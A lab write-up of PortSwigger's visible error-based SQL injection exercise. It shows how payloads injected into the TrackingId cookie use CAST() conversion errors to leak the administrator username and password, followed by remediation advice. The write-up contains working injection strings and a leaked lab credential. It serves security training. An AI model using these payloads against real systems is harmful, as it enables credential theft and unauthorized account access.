# PortSwigger Lab: Visible Error-Based SQL Injection

**Difficulty:** Practitioner
**Target:** PortSwigger Web Security Academy

## Objective

The goal of this lab is to exploit a SQL injection vulnerability residing in the `TrackingId` analytics cookie. Although the application does not return the results of the main SQL query directly on the page, it is misconfigured to return verbose database error messages in the HTTP response. We must craft payloads that intentionally trigger data-type conversion errors to leak the `administrator` password directly inside the error message and log into their account.

![Lab Description](images/Visible%20Error-Based%20SQL%20Injection/Lab%20Description.png)

## The Vulnerability Concept

Visible error-based SQL injection occurs when an application improperly exposes raw database exception messages (such as syntax errors or runtime type mismatches) to the user interface. Attackers can abuse functions like `CAST()` to force the database to convert a string result from a subquery (such as a username or password) into an incompatible data type like an `integer`. When the conversion fails, the database throws a runtime error that quotes the exact string value it failed to convert, turning the error message itself into a direct data exfiltration channel.

## Step-by-Step Exploitation

### 1. Reconnaissance & Traffic Interception

I started by launching the lab environment and browsing the main e-commerce storefront to generate standard HTTP traffic.

![Storefront Home](images/Visible%20Error-Based%20SQL%20Injection/Storefront%20Home.png)

Opening Burp Suite, I navigated to the **Proxy -> HTTP history** tab and located the initial `GET /` request containing the `TrackingId` cookie (`TrackingId=ab9NWAExspihqx9Z`).

![Proxy HTTP History](images/Visible%20Error-Based%20SQL%20Injection/Proxy%20HTTP%20History.png)

I sent this request over to **Burp Repeater** to begin testing the `TrackingId` cookie parameter for SQL injection.

![Burp Repeater Setup](images/Visible%20Error-Based%20SQL%20Injection/Burp%20Repeater%20Setup.png)

### 2. Probing for Verbose Errors & Syntax Constraints

To test how the application handles malformed SQL, I injected a single quote (`'`) at the end of the `TrackingId` value:
`TrackingId=ab9NWAExspihqx9Z'`

The server responded with an verbose SQL error directly in the HTML body:
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'ab9NWAExspihqx9Z''. Expected char`
This immediately confirmed the injection point and revealed the exact structure of the backend query.

![Single Quote Error](images/Visible%20Error-Based%20SQL%20Injection/Single%20Quote%20Error.png)

Next, I injected a second single quote (`''`) to escape the literal and balance the query syntax:
`TrackingId=ab9NWAExspihqx9Z''`

The error vanished and the server returned an `HTTP/2 200 OK`, proving that our input is being evaluated directly inside the SQL statement.

![Escaped Quote 200 OK](images/Visible%20Error-Based%20SQL%20Injection/Escaped%20Quote%20200%20OK.png)

I also verified that appending a standard SQL comment (`'--`) cleanly terminated the query and commented out the trailing quote, returning an `HTTP/2 200 OK`.

![Comment Termination 200 OK](images/Visible%20Error-Based%20SQL%20Injection/Comment%20Termination%20200%20OK.png)

### 3. Crafting the `CAST()` Exfiltration Payload

Knowing that verbose errors are rendered on the page, I attempted to use the `CAST()` function to convert a subquery result into an integer:
`TrackingId=ab9NWAExspihqx9Z' AND CAST((SELECT 1) AS int)--`

This triggered a specific PostgreSQL boolean error:
`ERROR: argument of AND must be type boolean, not type integer`

![Boolean Argument Error](images/Visible%20Error-Based%20SQL%20Injection/Boolean%20Argument%20Error.png)

To satisfy the `AND` operator's requirement for a boolean expression, I modified the payload to compare the `CAST()` result to `1` (`1=CAST(...)`):
`TrackingId=ab9NWAExspihqx9Z' AND 1=CAST((SELECT 1) AS int)--`

This evaluated to true without any type errors and returned an `HTTP/2 200 OK`.

![Valid Boolean Cast 200 OK](images/Visible%20Error-Based%20SQL%20Injection/Valid%20Boolean%20Cast%20200%20OK.png)

### 4. Overcoming the Character Limit & Multi-Row Restrictions

Next, I replaced `SELECT 1` with `SELECT username FROM users` to force a type conversion error that would leak a username:
`TrackingId=ab9NWAExspihqx9Z' AND 1=CAST((SELECT username FROM users) AS int)--`

However, the server returned an `Unterminated string literal` error, and the echoed query in the error message was cut off right at `AS'`. This revealed that the `TrackingId` parser enforces a strict **character length limit** on the cookie value!

![Character Limit Truncation Error](images/Visible%20Error-Based%20SQL%20Injection/Character%20Limit%20Truncation%20Error.png)

To free up space for my payload, I deleted the original 16-character tracking ID (`ab9NWAExspihqx9Z`) and started the cookie value immediately with a single quote:
`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`

With the character limit bypassed, the database executed the full query and returned a new error:
`ERROR: more than one row returned by a subquery used as an expression`

![More Than One Row Error](images/Visible%20Error-Based%20SQL%20Injection/More%20Than%20One%20Row%20Error.png)

### 5. Leaking the Administrator Credentials

Because `CAST()` can only process a single value at a time, I appended `LIMIT 1` to the subquery to restrict the output to the first row in the `users` table:
`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

When the database attempted to cast the resulting username string into an integer, it failed and leaked the value directly in the error message:
`ERROR: invalid input syntax for type integer: "administrator"`

![Leaking Administrator Username](images/Visible%20Error-Based%20SQL%20Injection/Leaking%20Administrator%20Username.png)

Knowing that the very first row in the `users` table belongs to `administrator`, I simply changed the selected column from `username` to `password`:
`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

The database threw the same type conversion error, immediately leaking the plaintext administrator password in the response:
`ERROR: invalid input syntax for type integer: "496wt10i47hxfo564oca"`

![Leaking Administrator Password](images/Visible%20Error-Based%20SQL%20Injection/Leaking%20Administrator%20Password.png)

### 6. Authentication & Verification

Armed with the leaked credentials (`administrator` / `496wt10i47hxfo564oca`), I navigated to the `/login` page in the browser and submitted the login form.

![Logging in as Administrator](images/Visible%20Error-Based%20SQL%20Injection/Logging%20in%20as%20Administrator.png)

The application authenticated the session, redirected me to the administrator's "My Account" dashboard, and displayed the **"Congratulations, you solved the lab!"** banner.

![Lab Solved](images/Visible%20Error-Based%20SQL%20Injection/Lab%20Solved.png)

## Remediation

To prevent visible error-based SQL injection, developers must implement two key defenses:

1. **Use Parameterized Queries (Prepared Statements):** Ensure all database queries—including those parsing cookies and HTTP headers—use parameterized queries so user input is strictly treated as literal data and cannot inject functions like `CAST()` or subqueries.
2. **Disable Verbose Error Messages in Production:** Configure the application and web server to catch database exceptions internally and display generic, user-friendly error pages. Raw SQL syntax errors and stack traces should only be logged securely on the backend, never reflected in HTTP responses.